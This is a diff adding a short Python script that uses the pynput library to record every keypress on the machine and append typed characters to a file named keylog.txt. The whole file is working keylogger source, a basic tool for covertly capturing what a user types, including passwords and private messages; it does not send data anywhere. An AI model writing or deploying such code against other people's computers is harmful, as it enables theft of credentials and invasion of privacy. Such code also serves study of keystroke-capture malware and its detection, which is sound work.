@@ -1,0 +1,17 @@
+from pynput import keyboard
+
+def keyPressed(key):
+    try:
+        print(str(key))
+        with open("keylog.txt", 'a') as logkey:
+            try:
+                char = key.char
+                logkey.write(char)
+            except AttributeError:
+                print("Special key {0} pressed".format(key))
+    except Exception as e:
+        print(f"Error: {e}")
+
+if __name__ == "__main__":
+    with keyboard.Listener(on_press=keyPressed) as listener:
+        listener.join()
